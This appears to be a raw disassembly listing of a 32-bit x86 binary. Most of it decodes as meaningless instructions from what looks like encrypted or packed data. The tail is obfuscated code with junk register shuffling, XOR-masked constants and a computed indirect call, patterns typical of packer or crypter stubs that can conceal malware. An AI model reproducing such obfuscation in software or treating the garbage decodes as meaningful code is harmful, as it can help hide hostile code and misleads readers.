  411328:	jg     0x411357
  41132a:	mov    cl,0xca
  41132c:	(bad)  
  41132d:	std    
  41132e:	maskmovq mm0,(bad)
  41132f:	test   DWORD PTR [edi],0x49f979b6
  411335:	fst    QWORD PTR [edi+ecx*8+0x1]
  411339:	pop    ebp
  41133a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41133b:	fistp  DWORD PTR [eax]
  41133d:	iret   
  41133e:	into   
  41133f:	or     eax,eax
  411341:	in     eax,0x53
  411343:	dec    esi
  411344:	push   esi
  411345:	popa   
  411346:	das    
  411347:	stos   DWORD PTR es:[edi],eax
  411348:	das    
  411349:	mov    eax,ds:0xf7bf2616
  41134e:	inc    ebp
  41134f:	add    ebx,edi
  411351:	out    0x7c,al
  411353:	inc    ecx
  411354:	icebp  
  411355:	fwait
  411356:	xchg   esi,eax
  411357:	jmp    0x4113cf
  411359:	aaa    
  41135a:	xlat   BYTE PTR ds:[ebx]
  41135b:	call   0x906f5c67
  411360:	xor    dh,BYTE PTR [esi]
  411362:	push   edi
  411363:	push   0x38441ef6
  411368:	mov    edi,0x8d0afb08
  41136d:	in     al,0x8b
  41136f:	xchg   edx,eax
  411370:	loope  0x411322
  411372:	jle    0x411375
  411374:	or     al,0x30
  411376:	ret    
  411377:	mov    eax,0x4cb441cb
  41137c:	jmp    0x411359
  41137e:	mov    al,0x86
  411380:	mov    ds:0x6ab50bf9,eax
  411385:	mov    ah,0x90
  411387:	jmp    0xe2f5:0x9ae5f8d5
  41138e:	pop    esp
  41138f:	xchg   ebp,eax
  411390:	int3   
  411391:	dec    ebx
  411392:	neg    cl
  411394:	(bad)  
  411395:	xor    ecx,DWORD PTR ds:0xf209f13d
  41139b:	ins    DWORD PTR es:[edi],dx
  41139c:	dec    ebx
  41139d:	pop    ebx
  41139e:	xchg   esp,ebx
  4113a0:	mov    ch,0xa7
  4113a2:	leave  
  4113a3:	mov    ah,dh
  4113a5:	mov    ecx,DWORD PTR [edx]
  4113a7:	xchg   ecx,eax
  4113a8:	imul   esp,DWORD PTR [ecx],0x6bca5df1
  4113ae:	mov    ecx,0x39f352cd
  4113b3:	loop   0x411429
  4113b5:	aaa    
  4113b6:	bound  esp,QWORD PTR [edi]
  4113b8:	call   0xb05b9d7b
  4113bd:	dec    esp
  4113be:	jno    0x411382
  4113c0:	pop    fs
  4113c2:	ficom  WORD PTR [eax]
  4113c4:	mov    ecx,0x86dcc7f5
  4113c9:	or     bh,BYTE PTR [ebx-0x66]
  4113cc:	rol    BYTE PTR [esi+0x13cc0926],cl
  4113d2:	xchg   edx,eax
  4113d3:	or     BYTE PTR [edx],0x48
  4113d6:	lds    ebx,FWORD PTR [edx+edi*2-0x14]
  4113da:	ret    
  4113db:	add    edx,DWORD PTR [esi-0x22454725]
  4113e1:	sbb    dl,BYTE PTR [eax]
  4113e3:	pop    edx
  4113e4:	jnp    0x41145f
  4113e6:	sbb    eax,0x4909b0fb
  4113eb:	gs iret 
  4113ed:	mov    es,WORD PTR [eax-0x137681e]
  4113f3:	into   
  4113f4:	lock cmp al,0xff
  4113f7:	repnz inc esp
  4113f9:	shl    BYTE PTR [ebp+ecx*4-0x41],0xf2
  4113fe:	(bad)  
  4113ff:	in     eax,0x5c
  411401:	out    dx,eax
  411402:	cmp    esi,ebx
  411404:	xor    BYTE PTR [ebp+0xbe80aa2],0xfa
  41140b:	into   
  41140c:	adc    edi,esp
  41140e:	cmp    BYTE PTR [ebx],0xcb
  411411:	popa   
  411412:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411413:	bound  ecx,QWORD PTR [eax]
  411415:	and    eax,0xabfce7e5
  41141a:	shl    DWORD PTR [eax+edx*2],cl
  41141d:	xlat   BYTE PTR ds:[ebx]
  41141e:	mul    DWORD PTR [edi-0x4]
  411421:	fist   DWORD PTR [eax+edi*1-0x5c]
  411425:	and    DWORD PTR [edx-0x59e81a68],edi
  41142b:	lock ret 0xe77a
  41142f:	das    
  411430:	or     eax,0xef72a379
  411435:	sub    al,0xe4
  411437:	and    esp,DWORD PTR [eax]
  411439:	adc    dh,cl
  41143b:	mov    edx,0x1f27c341
  411440:	cmp    al,0x75
  411442:	cmp    eax,0x99eecab
  411447:	and    eax,0xb36215f2
  41144c:	pop    ebx
  41144d:	shr    DWORD PTR [esi],1
  41144f:	in     al,0xac
  411451:	jg     0x7434e715
  411457:	add    DWORD PTR [ecx],esp
  411459:	mov    esp,0xc79fdcec
  41145e:	push   cs
  41145f:	mov    dl,0xf3
  411461:	fadd   DWORD PTR [esi-0x7a]
  411464:	out    dx,al
  411465:	adc    al,0x4e
  411467:	cwde   
  411468:	mov    edx,0xd0fa2122
  41146d:	fld    TBYTE PTR [ecx]
  41146f:	mov    ch,0xe8
  411471:	or     ebx,edi
  411473:	jmp    0xae6225ed
  411478:	pop    ss
  411479:	mov    ebx,0xad5e1ef4
  41147e:	inc    ecx
  41147f:	sbb    BYTE PTR [ebx],bh
  411481:	cmp    bh,BYTE PTR [eax+0x1f]
  411484:	lds    esi,FWORD PTR [ebx+0x35]
  411487:	imul   edx,DWORD PTR [edx-0x2b],0x39
  41148b:	ret    
  41148c:	pop    ss
  41148d:	sahf   
  41148e:	inc    ecx
  41148f:	adc    eax,0xebd2682d
  411494:	ret    0x8c38
  411497:	pop    es
  411498:	call   0x54ce933b
  41149d:	or     DWORD PTR [ebp+0x2c],ebx
  4114a0:	shl    DWORD PTR [edx-0x1],cl
  4114a3:	into   
  4114a4:	(bad)  
  4114a5:	xchg   ebp,eax
  4114a6:	cmp    ebp,DWORD PTR [eax-0x5d4097ef]
  4114ac:	mov    edx,0xfd8c3a5f
  4114b1:	std    
  4114b2:	add    ebp,ebp
  4114b4:	in     al,0x2e
  4114b6:	iret   
  4114b7:	ret    
  4114b8:	inc    esi
  4114b9:	mov    al,ds:0xd3cf2c2f
  4114be:	adc    BYTE PTR [ebp-0xa],ch
  4114c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4114c2:	push   edx
  4114c3:	pop    esp
  4114c4:	in     al,dx
  4114c5:	(bad)  
  4114c6:	addr16 in al,dx
  4114c8:	repz mov esi,0xdf8bc001
  4114ce:	dec    ebx
  4114cf:	sub    ax,ax
  4114d2:	icebp  
  4114d3:	shr    DWORD PTR ds:0x3190b9cc,1
  4114d9:	sbb    ah,0x6e
  4114dc:	cmp    edi,eax
  4114de:	add    BYTE PTR [esi],0xe0
  4114e1:	and    DWORD PTR [eax+0x11],ecx
  4114e4:	lds    edx,FWORD PTR [edx]
  4114e6:	shr    esi,1
  4114e8:	xor    esi,edi
  4114ea:	aas    
  4114eb:	jnp    0x41156c
  4114ed:	out    dx,al
  4114ee:	mov    esp,0x7934d1b2
  4114f3:	fs pop esp
  4114f5:	retf   
  4114f6:	dec    esi
  4114f7:	cmp    edx,DWORD PTR [edi+0x553f82fe]
  4114fd:	xor    DWORD PTR [esi-0x42fb023d],0xa
  411504:	inc    ecx
  411505:	add    esi,edx
  411507:	pop    ebp
  411508:	es xchg esp,eax
  41150a:	and    al,BYTE PTR ds:0x7938fe95
  411510:	xchg   BYTE PTR fs:[edx+0x1bdd1c9f],dl
  411517:	rcl    BYTE PTR [eax+0x3a340f5d],0x9d
  41151e:	mov    esi,0x83ca267e
  411523:	mov    ah,0xbf
  411525:	je     0x411518
  411527:	test   al,0xfe
  411529:	cwde   
  41152a:	imul   esp,DWORD PTR [ebx],0x6
  41152d:	(bad)  
  41152e:	sbb    al,BYTE PTR [esp+eax*1-0x2f]
  411532:	fsub   DWORD PTR [eax]
  411534:	aas    
  411535:	jmp    0x6b49:0x9a8249d6
  41153c:	pop    edx
  41153d:	mov    WORD PTR [ecx+esi*8-0x603eb0b2],cs
  411544:	mov    BYTE PTR [edi-0x2557fcdd],dl
  41154a:	test   eax,0xc7b2d451
  41154f:	test   DWORD PTR [ecx+esi*8+0x240fb52b],0xe05bce15
  41155a:	inc    ebp
  41155b:	add    dh,BYTE PTR [edi]
  41155d:	popa   
  41155e:	sub    dh,BYTE PTR [ebx-0x49493b38]
  411564:	sti    
  411565:	ss cdq 
  411567:	call   0xf52299
  41156c:	mov    ah,0x12
  41156e:	adc    eax,0x4c401ab
  411573:	ret    
  411574:	sar    DWORD PTR [esi-0x405dd057],1
  41157a:	cmp    ecx,esp
  41157c:	push   0x6bfa2f67
  411581:	das    
  411582:	in     eax,dx
  411583:	mov    BYTE PTR [edx+0x4],cl
  411586:	out    0x5e,eax
  411588:	idiv   dh
  41158a:	sub    BYTE PTR [ecx+0x27],0x3b
  41158e:	cmp    BYTE PTR [edx+edx*2-0x7a0454ae],bh
  411595:	xor    BYTE PTR [ebx+0x6e],0xd5
  411599:	fmulp  st(2),st
  41159b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41159c:	and    ebp,ebx
  41159e:	cmp    al,0xaf
  4115a0:	loope  0x411549
  4115a2:	fild   DWORD PTR [edi-0x7f14e969]
  4115a8:	jp     0x41153f
  4115aa:	stos   DWORD PTR es:[edi],eax
  4115ab:	push   ebp
  4115ac:	loope  0x411559
  4115ae:	es mov al,0xec
  4115b1:	inc    ebx
  4115b2:	or     al,0xbb
  4115b4:	aad    0x1f
  4115b6:	dec    esp
  4115b7:	add    ah,ch
  4115b9:	xor    BYTE PTR [ecx-0x4a],al
  4115bc:	dec    edi
  4115bd:	hlt    
  4115be:	mov    dh,0xcc
  4115c0:	mov    WORD PTR [ecx+0x6abd4e99],es
  4115c6:	inc    esi
  4115c7:	fnstsw WORD PTR [edx]
  4115c9:	popf   
  4115ca:	jmp    0xede1:0xc05edf3d
  4115d1:	pop    esi
  4115d2:	sar    BYTE PTR [ecx],1
  4115d4:	neg    ecx
  4115d6:	sub    cl,al
  4115d8:	inc    edi
  4115da:	test   ah,0x6c
  4115dd:	push   0xffffffa4
  4115df:	enter  0xd76c,0xc5
  4115e3:	fwait
  4115e4:	cmp    ch,bl
  4115e6:	pop    ebx
  4115e7:	mov    ch,0x2a
  4115e9:	jg     0x4115ff
  4115eb:	fistp  QWORD PTR [edi]
  4115ed:	cmp    DWORD PTR [ecx],ebp
  4115ef:	ins    DWORD PTR es:[edi],dx
  4115f0:	popa   
  4115f1:	in     al,0xa1
  4115f3:	mov    eax,0xd282ef2a
  4115f8:	pop    esi
  4115f9:	xchg   DWORD PTR [ebp-0x1105cdb4],ebx
  4115ff:	cmp    eax,0xc059ed87
  411604:	mov    edi,0x42fec62e
  411609:	and    al,0xa7
  41160b:	call   0x3575:0x8bb0ea7
  411612:	shr    dh,0x41
  411615:	ds out 0xd7,eax
  411618:	ss add DWORD PTR ds:0x156cc0ef,0x33
  411621:	pop    esi
  411622:	ror    BYTE PTR [ebp+eiz*8+0x75],1
  411626:	dec    ecx
  411627:	cmp    al,0x47
  411629:	adc    BYTE PTR [edi-0x2],ch
  41162c:	jae    0x41168c
  41162e:	push   0xfefee4f
  411633:	jecxz  0x411629
  411635:	dec    esp
  411636:	lock mov edi,DWORD PTR [edx-0x667cf736]
  41163d:	lea    edi,[eax-0x4a]
  411640:	jne    0x41163d
  411642:	or     DWORD PTR [edi-0x3149be56],0xffffffbf
  411649:	idiv   DWORD PTR [edx+0x3a724ebd]
  41164f:	adc    bl,bh
  411651:	call   0x50db:0xdadbb412
  411658:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411659:	or     al,0x67
  41165b:	and    BYTE PTR [ebx+0x5d],cl
  41165e:	aas    
  41165f:	mov    esi,0xfed73356
  411664:	sbb    DWORD PTR [ebx+0x52b7c969],ebx
  41166a:	sbb    DWORD PTR [edi],esp
  41166c:	xchg   esp,eax
  41166d:	lock push edx
  41166f:	lahf   
  411670:	enter  0xfe73,0x71
  411674:	scas   eax,DWORD PTR es:[edi]
  411675:	test   eax,0x32be67fb
  41167a:	aaa    
  41167b:	xlat   BYTE PTR ds:[ebx]
  41167c:	push   0x2f
  41167e:	mov    cl,0x95
  411680:	(bad)  
  411681:	push   ss
  411682:	jo     0x411687
  411684:	shr    BYTE PTR [edx],cl
  411686:	pop    esp
  411687:	cmp    eax,0xda4643b5
  41168c:	mov    esp,0xe08381f8
  411691:	xchg   esi,eax
  411692:	pop    edx
  411693:	pop    ebx
  411694:	sti    
  411695:	cmp    edx,DWORD PTR [ebx-0x41]
  411698:	rcr    BYTE PTR [eax],0x34
  41169b:	out    0x4e,eax
  41169d:	fisub  DWORD PTR [ecx+0x177831be]
  4116a3:	add    DWORD PTR [esi-0x45],0x184144ab
  4116aa:	enter  0x58ff,0x54
  4116ae:	and    BYTE PTR [edx],bh
  4116b0:	jge    0x41169b
  4116b2:	jp     0x411694
  4116b4:	fnstsw WORD PTR [eax]
  4116b6:	cdq    
  4116b7:	pushf  
  4116b8:	adc    cl,BYTE PTR [ecx+eiz*1-0x3a72ff6d]
  4116bf:	mov    edx,esp
  4116c1:	pop    ds
  4116c2:	mov    ds:0x8f9a632a,eax
  4116c7:	pop    esp
  4116c8:	loopne 0x41165f
  4116ca:	cmp    eax,0xe046b472
  4116cf:	mov    BYTE PTR [edi-0x65d14e6f],dl
  4116d5:	pop    edx
  4116d6:	sbb    ch,dh
  4116d8:	pop    ss
  4116d9:	or     ch,BYTE PTR [edi-0x25]
  4116dc:	push   cs
  4116dd:	daa    
  4116de:	mov    ebx,ss
  4116e0:	retf   0xd217
  4116e3:	test   eax,0xffd8a372
  4116e8:	inc    eax
  4116e9:	sbb    eax,0xb229972a
  4116ee:	lahf   
  4116ef:	add    DWORD PTR [edx],edx
  4116f1:	mov    eax,ds:0x30dc1f77
  4116f6:	mov    ecx,0x9f45b884
  4116fb:	xor    al,0xb3
  4116fd:	push   0x7d74f5ae
  411702:	dec    esi
  411703:	sbb    eax,0x60bcbcf7
  411708:	sub    DWORD PTR [edi-0x47],0x13c3777e
  41170f:	jge    0x4116d5
  411711:	pop    esi
  411712:	jb     0x411789
  411714:	arpl   WORD PTR [edx+eax*2],dx
  411717:	ss repnz call 0xfff7:0x56bba6b6
  411720:	scas   eax,DWORD PTR es:[edi]
  411721:	and    BYTE PTR [ebx+0x19],bh
  411724:	or     al,0xe9
  411726:	iret   
  411727:	gs xchg esi,eax
  411729:	xchg   esi,eax
  41172a:	adc    BYTE PTR [ebp-0x29ea3fd8],0x1f
  411731:	mov    bl,0x7a
  411733:	dec    esi
  411734:	int3   
  411735:	in     al,0x5d
  411737:	repnz scas al,BYTE PTR es:[edi]
  411739:	out    dx,al
  41173a:	outs   dx,BYTE PTR ds:[esi]
  41173b:	fwait
  41173c:	inc    esi
  41173d:	fidivr WORD PTR [esi-0x75]
  411740:	cmp    eax,0xc6b4f397
  411745:	ss scas eax,DWORD PTR es:[edi]
  411747:	jmp    0x411729
  411749:	add    BYTE PTR [edi+0x71],ch
  41174c:	xchg   esp,eax
  41174d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41174e:	mov    bh,0x66
  411750:	mov    ebx,0x5d6315b
  411755:	cdq    
  411756:	add    eax,0x4c69cd7f
  41175b:	fs mov ebp,0x88226ff3
  411761:	xor    al,0xaf
  411763:	xchg   esp,eax
  411764:	lods   al,BYTE PTR ds:[esi]
  411765:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411766:	push   ecx
  411767:	push   esp
  411768:	inc    esp
  411769:	and    eax,0x8c3cac8c
  41176e:	pop    edx
  41176f:	sti    
  411770:	mov    bl,0xa4
  411772:	(bad)  
  411773:	imul   DWORD PTR [ecx+0x6b6f1056]
  411779:	sbb    ecx,DWORD PTR [ecx-0x10ae562b]
  41177f:	adc    BYTE PTR [ebx+0x76],0xf3
  411783:	imul   DWORD PTR [esi-0x36218356]
  411789:	inc    edi
  41178a:	cmp    BYTE PTR [esi],0x19
  41178d:	stos   BYTE PTR es:[edi],al
  41178e:	mov    cl,ch
  411790:	pushf  
  411791:	sbb    DWORD PTR [esi+0x66],eax
  411794:	call   0xfbbfaca6
  411799:	sbb    al,0xfa
  41179b:	pusha  
  41179c:	ins    DWORD PTR es:[edi],dx
  41179d:	popf   
  41179e:	mov    WORD PTR [bp+si-0x46f0],?
  4117a3:	fadd   QWORD PTR [esi+0x7b4e18cf]
  4117a9:	jmp    0x4117ee
  4117ab:	ss cmp eax,0xbdaffa71
  4117b1:	js     0x411776
  4117b3:	mov    WORD PTR [esi],ss
  4117b5:	outs   dx,DWORD PTR ds:[esi]
  4117b6:	mov    ebp,0x5e6a9a1b
  4117bb:	jne    0x41182e
  4117bd:	jmp    0xa94e:0x718ca5c6
  4117c4:	loop   0x41177f
  4117c6:	dec    ebx
  4117c7:	shl    BYTE PTR [ecx],cl
  4117c9:	lea    esi,[edi]
  4117cb:	adc    ch,ah
  4117cd:	xchg   ebx,edx
  4117cf:	or     DWORD PTR [eax-0xf28984a],ebp
  4117d5:	pop    ebp
  4117d6:	in     al,dx
  4117d7:	in     al,0x93
  4117d9:	(bad)  
  4117da:	mov    ch,0xf5
  4117dc:	dec    ebp
  4117dd:	mov    eax,ds:0x2641ce46
  4117e2:	in     eax,dx
  4117e3:	jge    0x411771
  4117e5:	imul   ebx,DWORD PTR [ecx-0x7536a96e],0x4a
  4117ec:	mov    esp,0x11d74f09
  4117f1:	loopne 0x411795
  4117f3:	repz pushf 
  4117f5:	stc    
  4117f6:	sar    BYTE PTR [ecx],cl
  4117f8:	adc    DWORD PTR [ebx-0x4067a826],ebp
  4117fe:	ins    BYTE PTR es:[edi],dx
  4117ff:	loopne 0x411812
  411801:	xchg   BYTE PTR [esp+ecx*1+0x18b70744],cl
  411808:	mov    eax,ds:0x7027ddb6
  41180d:	or     al,0x21
  41180f:	and    DWORD PTR [edi-0x33b29f6f],0xffffffeb
  411816:	inc    ebp
  411817:	enter  0xb27e,0xc1
  41181b:	xchg   ebp,eax
  41181c:	xchg   esi,eax
  41181d:	rcl    DWORD PTR [esi+ecx*1],cl
  411820:	push   ebp
  411821:	push   es
  411822:	test   al,0x59
  411824:	mov    eax,0xda9a3a8b
  411829:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41182a:	dec    ebx
  41182b:	and    BYTE PTR [eax+0x1e],0x23
  41182f:	daa    
  411830:	aam    0xa0
  411832:	cmc    
  411833:	xchg   esp,eax
  411834:	enter  0x8c1,0xd7
  411838:	gs push 0xffffffe0
  41183b:	cmp    edi,edx
  41183d:	test   DWORD PTR [esi-0x6b],esp
  411840:	xchg   ebx,eax
  411841:	sbb    ecx,edi
  411843:	inc    edi
  411844:	sbb    BYTE PTR [ebp-0x25],ch
  411847:	sub    al,bl
  411849:	lock cli 
  41184b:	cmp    DWORD PTR [ebx],ebx
  41184d:	xor    al,BYTE PTR [ecx+0x39]
  411850:	jl     0x4117de
  411852:	cld    
  411853:	dec    edx
  411854:	ror    DWORD PTR [eax-0x1f],cl
  411857:	jle    0x4117f1
  411859:	push   edi
  41185a:	scas   eax,DWORD PTR es:[edi]
  41185b:	jecxz  0x41185f
  41185d:	mov    al,ds:0x8152380c
  411862:	int3   
  411863:	xor    al,BYTE PTR ds:0x8e282a74
  411869:	add    DWORD PTR [ebx-0x56],0x39f4f9dc
  411870:	jl     0x41188e
  411872:	dec    ecx
  411873:	and    BYTE PTR [ecx-0x1cd5ff21],0xab
  41187a:	mov    edx,0xb0a4af93
  41187f:	sbb    ebx,DWORD PTR [edx]
  411881:	jnp    0x411838
  411883:	or     edx,edi
  411885:	jmp    0x411869
  411887:	mov    bh,0xd9
  411889:	sti    
  41188a:	call   0xc19633fd
  41188f:	ror    ah,cl
  411891:	ja     0x41185b
  411893:	add    al,0xc3
  411895:	jmp    0x28c80cd6
  41189a:	(bad)  
  41189c:	push   0xffffffd9
  41189e:	jg     0x411901
  4118a0:	dec    ecx
  4118a1:	inc    BYTE PTR [edi+0x598b23d9]
  4118a7:	xor    al,0xaf
  4118a9:	sbb    eax,DWORD PTR [esi+0x19]
  4118ac:	out    0x6f,al
  4118ae:	imul   edx,ecx,0xfffffffe
  4118b1:	sbb    dl,bh
  4118b3:	leave  
  4118b4:	mov    ah,0x9a
  4118b6:	pop    eax
  4118b7:	les    eax,FWORD PTR [ebx]
  4118b9:	fild   QWORD PTR [edx]
  4118bb:	jge    0x4118f5
  4118bd:	out    dx,eax
  4118be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4118bf:	jle    0x41188d
  4118c1:	push   ebp
  4118c2:	call   0x4965:0xe89f3bba
  4118c9:	jg     0x41184e
  4118cb:	add    eax,ebx
  4118cd:	fld    DWORD PTR [edi+eax*4-0x70]
  4118d1:	pop    DWORD PTR [esi]
  4118d3:	xchg   ebp,eax
  4118d4:	das    
  4118d5:	daa    
  4118d6:	cmp    ebx,DWORD PTR fs:[ecx+ebp*1-0x51ba9440]
  4118de:	vaddss xmm5,xmm5,DWORD PTR [edi+0x210d8216]
  4118e6:	push   esi
  4118e7:	scas   al,BYTE PTR es:[edi]
  4118e8:	retf   0xa801
  4118eb:	xor    BYTE PTR [ebx-0x38],dh
  4118ee:	stos   BYTE PTR es:[edi],al
  4118ef:	jmp    0xf8ba1e3f
  4118f4:	sbb    esi,edx
  4118f6:	pop    ebp
  4118f7:	stos   DWORD PTR es:[edi],eax
  4118f8:	xchg   ecx,eax
  4118f9:	data16 jl 0x411946
  4118fc:	mov    bh,0xa8
  4118fe:	aam    0x64
  411900:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411901:	jmp    0xf42e:0x728e0572
  411908:	shl    DWORD PTR [ecx],0x31
  41190b:	jbe    0x4118c7
  41190d:	adc    al,BYTE PTR [edi+ecx*1+0x5b]
  411911:	push   ebx
  411912:	cld    
  411913:	mov    esp,0x3b738c07
  411918:	aad    0x52
  41191a:	call   0xb65d030b
  41191f:	test   DWORD PTR [edi+0x77],eax
  411922:	iret   
  411923:	js     0x4118aa
  411925:	(bad)  
  411926:	jnp    0x41196b
  411928:	pop    edi
  411929:	or     eax,0xc132e5d7
  41192e:	ds jle 0x411976
  411931:	cmp    BYTE PTR [edx],0x74
  411934:	sti    
  411935:	sbb    al,0x11
  411937:	imul   edi,DWORD PTR [ecx],0xffffffbc
  41193a:	(bad)  
  41193c:	ins    DWORD PTR es:[edi],dx
  41193d:	jp     0x4118dd
  41193f:	rol    DWORD PTR [ebp+0x3f],1
  411942:	jl     0x4118d9
  411944:	ja     0x41191f
  411946:	inc    esp
  411947:	mov    WORD PTR [ebp+0x29],fs
  41194a:	jb     0x41195c
  41194c:	enter  0xd832,0xe
  411950:	mov    esp,0x14741b58
  411955:	ffree  st(5)
  411957:	jnp    0x41194c
  411959:	sti    
  41195a:	test   al,0x62
  41195c:	repz rcr BYTE PTR ds:0xe31311ef,0x22
  411964:	xor    cl,BYTE PTR [eax-0x5f]
  411967:	sahf   
  411968:	in     al,0x5d
  41196a:	lock sub dh,BYTE PTR [esi+0x3a]
  41196e:	mov    ebx,0x18dfb0ba
  411973:	fstp   st(6)
  411975:	les    ebx,FWORD PTR [edi]
  411977:	outs   dx,DWORD PTR ds:[esi]
  411978:	cli    
  411979:	push   es
  41197a:	xchg   esp,eax
  41197b:	jno    0x41193c
  41197d:	cmp    DWORD PTR gs:[esi],ebx
  411980:	and    ch,BYTE PTR [edx+edx*2+0x6f]
  411984:	dec    edi
  411985:	mov    ah,0x7f
  411987:	iret   
  411988:	fbstp  TBYTE PTR ds:0x715daf83
  41198e:	daa    
  41198f:	fisttp WORD PTR [ecx+0x3a]
  411992:	ja     0x411a11
  411994:	mov    esi,0xb3697826
  411999:	or     al,0x63
  41199b:	push   0x14fd43cb
  4119a0:	(bad)  
  4119a1:	sbb    ebx,DWORD PTR [edi-0x6a300b93]
  4119a7:	or     ch,BYTE PTR [ecx]
  4119a9:	xor    esi,edx
  4119ab:	retf   0xa669
  4119ae:	jae    0x41198b
  4119b0:	sbb    BYTE PTR [eax],0xe5
  4119b3:	pop    eax
  4119b4:	lods   eax,DWORD PTR ds:[esi]
  4119b5:	data16 sbb dh,BYTE PTR [ebp-0x1d]
  4119b9:	popa   
  4119ba:	mov    ch,0xa5
  4119bc:	dec    ebx
  4119bd:	ds dec ebx
  4119bf:	xchg   ebp,eax
  4119c0:	mov    ecx,0xc946ec08
  4119c5:	jp     0x4119da
  4119c7:	push   ds
  4119c8:	ja     0x411a00
  4119ca:	mov    bh,0xe9
  4119cc:	sub    DWORD PTR [esi-0x1785f161],ecx
  4119d2:	push   ebp
  4119d3:	mov    ds:0x5f173161,eax
  4119d8:	xor    edi,DWORD PTR [ecx]
  4119da:	stos   BYTE PTR es:[edi],al
  4119db:	push   ss
  4119dc:	adc    eax,0xe335b560
  4119e1:	aas    
  4119e2:	cwde   
  4119e3:	shr    BYTE PTR [ecx+0x32],1
  4119e6:	pop    esp
  4119e7:	push   0x7
  4119e9:	jge    0x4119f9
  4119eb:	add    al,0x69
  4119ed:	pop    edx
  4119ee:	cli    
  4119ef:	fnstcw WORD PTR [ebx-0x41]
  4119f2:	shl    ebx,1
  4119f4:	jg     0x411983
  4119f6:	iret   
  4119f7:	ins    DWORD PTR es:[edi],dx
  4119f8:	cmp    cl,ch
  4119fa:	std    
  4119fb:	lahf   
  4119fc:	sub    dl,BYTE PTR [ebx]
  4119fe:	fwait
  4119ff:	and    esp,DWORD PTR [ebp-0xb9a1c8]
  411a05:	inc    esi
  411a06:	int    0x28
  411a08:	call   0xbf5b:0x945c19c8
  411a0f:	cs mov ebx,0xa1e645cb
  411a15:	int    0x66
  411a17:	or     eax,edi
  411a19:	in     eax,dx
  411a1a:	push   edx
  411a1b:	or     dh,dh
  411a1d:	xor    bl,cl
  411a1f:	enter  0xab91,0x65
  411a23:	pop    esi
  411a24:	xor    ecx,esi
  411a26:	add    ecx,edi
  411a28:	xor    edx,edx
  411a2a:	div    ecx
  411a2c:	mov    ecx,DWORD PTR [ebp-0x4]
  411a2f:	xor    ecx,esi
  411a31:	lea    eax,[ecx+eax*1+0x3272f6]
  411a38:	mov    ecx,DWORD PTR [ebp+0x8]
  411a3b:	mov    edx,DWORD PTR [ebp-0x20]
  411a3e:	mov    DWORD PTR [edx+ecx*4],eax
  411a41:	mov    eax,DWORD PTR [ebp-0xc]
  411a44:	mov    ecx,DWORD PTR [ebp+0x8]
  411a47:	xor    eax,esi
  411a49:	lea    eax,[eax+ecx*1+0x3272f6]
  411a50:	mov    DWORD PTR [ebp+0x8],eax
  411a53:	mov    eax,DWORD PTR [ebp-0xc]
  411a56:	mov    ecx,DWORD PTR [ebp+0x14]
  411a59:	xor    eax,esi
  411a5b:	add    eax,edi
  411a5d:	imul   eax,DWORD PTR [ecx]
  411a60:	mov    ecx,DWORD PTR [ebp-0x4]
  411a63:	mov    edx,DWORD PTR [ebp+0x8]
  411a66:	xor    ecx,esi
  411a68:	lea    ecx,[ecx+edx*1+0x3272f6]
  411a6f:	cmp    ecx,eax
  411a71:	jne    0x40f668
  411a77:	mov    eax,DWORD PTR [ebp-0x4]
  411a7a:	xor    eax,esi
  411a7c:	add    eax,edi
  411a7e:	mov    DWORD PTR [ebp-0x10],eax
  411a81:	mov    ebx,0x65655
  411a86:	add    ebx,0x3234
  411a8c:	xchg   ebx,esi
  411a8e:	xor    ebx,ebx
  411a90:	push   esi
  411a91:	mov    esi,ebx
  411a93:	pop    ebx
  411a94:	mov    edx,esi
  411a96:	add    ebx,0x1002
  411a9c:	lea    eax,[ebp-0x18]
  411a9f:	add    edx,eax
  411aa1:	add    edx,0x5
  411aa4:	push   edx
  411aa5:	inc    esi
  411aa6:	pop    ecx
  411aa7:	dec    ecx
  411aa8:	xchg   ecx,eax
  411aa9:	dec    eax
  411aaa:	xchg   ecx,eax
  411aab:	dec    ecx
  411aac:	xchg   ecx,edx
  411aae:	dec    edx
  411aaf:	push   edx
  411ab0:	mov    edx,ebx
  411ab2:	pop    ebx
  411ab3:	dec    ebx
  411ab4:	call   DWORD PTR [ebx]
  411ab6:	cmp    DWORD PTR [ebp+0x10],esi
  411ab9:	je     0x411ada
  411abf:	xchg   edx,eax
  411ac0:	push   0xc
  411ac2:	pop    ecx
  411ac3:	dec    ecx
  411ac4:	push   0x3
  411ac6:	pop    ebx
  411ac7:	inc    ebx
  411ac8:	xchg   ebx,ecx
  411aca:	inc    ecx
  411acb:	sub    ebx,ecx
  411acd:	xchg   ebx,ecx
  411acf:	dec    ecx
  411ad0:	dec    ecx
  411ad1:	mov    eax,DWORD PTR [ebp-0x1c]
  411ad4:	imul   eax,ecx
  411ad7:	add    esp,eax
  411ad9:	xchg   edx,eax
  411ada:	push   eax
  411adb:	xor    ebx,ebx
  411add:	mov    edx,esp
  411adf:	dec    edx
  411ae0:	inc    ebx
  411ae1:	add    ebx,DWORD PTR [edx+ebx*1]
  411ae4:	dec    ebx
  411ae5:	xor    edx,edx
  411ae7:	add    DWORD PTR [ebp-0x10],ebx
  411aea:	pop    ebx
  411aeb:	mov    eax,DWORD PTR [ebp-0x10]
  411aee:	pop    edi
  411aef:	pop    esi
  411af0:	pop    ebx
  411af1:	leave  
  411af2:	ret    0x10
  411af5:	push   ebp
  411af6:	mov    ebp,esp
  411af8:	push   ecx
  411af9:	mov    DWORD PTR [ebp-0x4],0xf89c85a1
  411b00:	mov    eax,DWORD PTR [ebp-0x4]
  411b03:	sbb    DWORD PTR ds:0x432ea7,ebx
  411b09:	mov    edx,DWORD PTR [ebp+0x10]
  411b0c:	mov    ecx,0x75108af
  411b11:	sbb    DWORD PTR ds:0x432eaf,0x432e4b
  411b1b:	xor    eax,ecx
  411b1d:	or     DWORD PTR ds:0x432e77,0x432e2b
  411b27:	add    eax,0x3272f6
  411b2c:	and    DWORD PTR ds:0x432e77,0x1e6e
  411b36:	mov    DWORD PTR [edx],eax
